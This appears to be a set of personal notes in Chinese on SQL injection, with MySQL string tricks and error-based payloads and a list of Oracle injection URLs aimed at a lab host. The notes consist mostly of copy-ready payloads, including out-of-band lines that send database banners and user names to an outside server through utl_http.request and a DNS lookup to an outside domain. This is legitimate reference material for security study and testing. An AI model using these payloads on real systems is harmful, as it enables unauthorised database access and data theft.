## mysql

### 基础

- 注释
    - 单行注释

    特别注意，`--`这种注释后要加一个空格

    ```sql
    # select 1;
    -- select 1;
    ```

    - 多行注释

    ```sql
    /*
    select 1;
    select 2;
    */
    ```

- 类型转换
    ```sql
    SELECT CAST(123 AS CHAR); # 字符串转换
    ```

---

### 字符串拼接

1. 以空格隔开字符串（但是这样不能拼接函数）

        ```sql
        select 'a' 'b' 'c'; # select 'a' version(); 这样写会出错
        +-----+
        | a   |
        +-----+
        | abc |
        +-----+
        ```
2. 可以将字符串转换为16进制，再将16进制转换为整数

    - mysql里字符串与数字用`+`连接结果为数字

    ```sql
    select 'def'+233;
    +-----------+
    | 'def'+233 |
    +-----------+
    |       233 |
    +-----------+

    select 'a'+0xffffffffffff; # 现在是6字节整数，再添加一位结果会变为浮点数（不同版本可能不一样）
    +--------------------+
    | 'a'+0xffffffffffff |
    +--------------------+
    |    281474976710655 |
    +--------------------+
    ```

    - 字符串转十六进制

    ```sql
    +------------------------------------+
    | hex(version())                     |          # 字符串转十六进制
    +------------------------------------+
    | 31302E312E32392D4D6172696144422D36 |
    +------------------------------------+

    +---------------------------------------------+
    | unhex('31302E312E32392D4D6172696144422D36') | # 十六进制转字符串
    +---------------------------------------------+
    | 10.1.29-MariaDB-6                           |
    +---------------------------------------------+
    ```

    - 字符串截取

    ```sql
    +-----------------------------------------------------+
    | substr('31302E312E32392D4D6172696144422D36', 1, 12) | # 从第一位截取到第12位（当成16进制看也就是6个字节的整数）
    +-----------------------------------------------------+
    | 31302E312E32                                        |
    +-----------------------------------------------------+

	+----------------------------+
	| substr('abc' from 1 for 2) |
	+----------------------------+
	| ab                         |
	+----------------------------+
    ```

    -  进制转换

    ```sql
    +----------------------------------+
    | conv('31302E312E32', 16, 10)     | # 将16进制转为10进制
    +----------------------------------+
    |                   54083003166258 |
    +----------------------------------+
    ```

	- ascii（ord)

	```sql
	+-----------------------------+
	| ascii(substr('abc' from 3)) |
	+-----------------------------+
	|                          99 |
	+-----------------------------+
	```

	- 多行合并

	```sql
	MariaDB [sec]> select group_concat(username) from admin;
	+------------------------+
	| group_concat(username) |
	+------------------------+
	| admin,tom              |
	+------------------------+
	```

### 报错注入（mariaDB中可用的）

- floor(rand(0)*2)

	```sql
	MariaDB [sec]> select count(*) ,concat(DATABASE(),floor(rand(0)*2))x from information_schema.tables group by x;
	ERROR 1062 (23000): Duplicate entry 'sec1' for key 'group_key'

	MariaDB [sec]> select * from admin where 0='1' or  (select 1 from(select count(*), concat(DATABASE(), floor(rand(0)*2)) x from information_schema.tables group by x)a);
	ERROR 1062 (23000): Duplicate entry 'sec1' for key 'group_key'
	```

- extractvalue()

	```sql
	MariaDB [sec]> select extractvalue(1,'~aaa');
	ERROR 1105 (HY000): XPATH syntax error: '~aaa'
	MariaDB [sec]> select extractvalue(1,'<aaa');
	ERROR 1105 (HY000): XPATH syntax error: '<aaa'
	MariaDB [sec]> select extractvalue(1,'>aaa');
	ERROR 1105 (HY000): XPATH syntax error: '>aaa'

	MariaDB [sec]> select * from admin where 0='1'or (select extractvalue(1, concat('~', DATABASE())));
	ERROR 1105 (HY000): XPATH syntax error: '~sec'
	```

- updatexml()

	```sql
	MariaDB [sec]> select updatexml(1,'~aaa', 1);    # 同 extractvalue 类似
	ERROR 1105 (HY000): XPATH syntax error: '~aaa'

	MariaDB [sec]> select * from admin where 0='1'or (select updatexml(1, concat('~', DATABASE()), 1));
	ERROR 1105 (HY000): XPATH syntax error: '~sec'
	```

## oracle

### 基础

- 单行注释

	```sql
	-- select 1 from dual;
	```

- 多行注释

	```sql
	/*
	select 1 from dual;
	select 2 from dual;
	*/
	```

- 拼接行（不能太长）

	```sql
	select wmsys.wm_concat(t.column) from tableName t; # 10g后默认不支持

	select listagg(table_name, ',') within group (order by table_name) from user_tables where rownum < 10;
	```
	

### 报错注入

对一些返回报错信息但又不会返回查询结果的漏洞，可尝试“报错注入”

- utl_inaddr.get_host_name()进行报错注入

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and 1=utl_inaddr.get_host_name((select user from dual))--
	```

- 使用ctxsys.drithsx.sn()进行报错注入

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and 1=ctxsys.drithsx.sn(1,(select user from dual))--
	```

- 使用XMLType()进行报错注入

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--
	```

- 使用dbms_xdb_version.checkin()进行报错注入

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--
	```

- 使用dbms_xdb_version.makeversioned()进报错注入

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null--
	```

- 使用dbms_xdb_version.uncheckout()进行报错注入

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null--
	```

- 使用dbms_utility.sqlid_to_sqlhash()进行报错注入

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null--
	```

- 使用ordsys.ord_dicom.getmappingxpath()进行报错注入

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1'  and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--

	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1'  and 1=ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user)--
	```

- 使用decode进行报错注入，这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1'and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual) --
	```

### 外带通信

- utl_http.request()

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' or 1=utl_http.request('http://10.10.10.1:80/'||(select banner from sys.v_$version where rownum=1)) --
	```

- utl_inaddr.get_host_address()

	```
	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select utl_inaddr.get_host_address((select user from dual)||'.t4inking.win') from dual)is not null--
	```

## mssql


## mongodb


## 参考

> [少年，这是我特意为你酿制的Oracle 注入，干了吧！](https://bbs.ichunqiu.com/thread-26734-1-1.html)
> [十种MySQL报错注入](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)




